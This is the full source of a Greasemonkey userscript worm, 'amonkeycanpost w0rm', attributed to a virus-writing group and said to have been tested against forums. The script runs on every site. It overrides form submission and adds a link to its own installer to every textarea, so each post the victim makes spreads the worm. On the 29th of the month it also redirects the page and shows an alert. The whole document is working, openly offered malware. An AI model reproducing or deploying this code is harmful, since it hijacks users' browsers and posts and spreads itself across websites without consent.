// This small code shows how to abuse greasemonkey ... :P by WarGame/DoomRiderz
// I did all the tests against forums

// ==UserScript==
// @name          amonkeycanpost w0rm
// @namespace     http://vx.netlux.org/wargamevx
// @description   amonkeycanpost w0rm by WarGame/DoomRiderz
// @include       *
// ==/UserScript==

function w0rm(event) {
    var form = event ? event.target : this;
    var all, current;
	
	all = document.getElementsByTagName('textarea');
	// scan for all textarea, so we can append our evil link
	for (var i = 0; i < all.length; i++) {
		current = all[i];
		current.value += "\n\nhttp://www.example.org/amonkeycanpost.user.js";
	}
	
	var payload = new Date();
	if(payload.getDate() == 29) // :P
	{
		location.href="http://en.wikipedia.org/wiki/Charles_Darwin";
		alert("A monkey can post!");
	}
	
	form._submit(); // post!
}

window.addEventListener('submit',w0rm, true);

HTMLFormElement.prototype._submit = HTMLFormElement.prototype.submit;
HTMLFormElement.prototype.submit = w0rm;
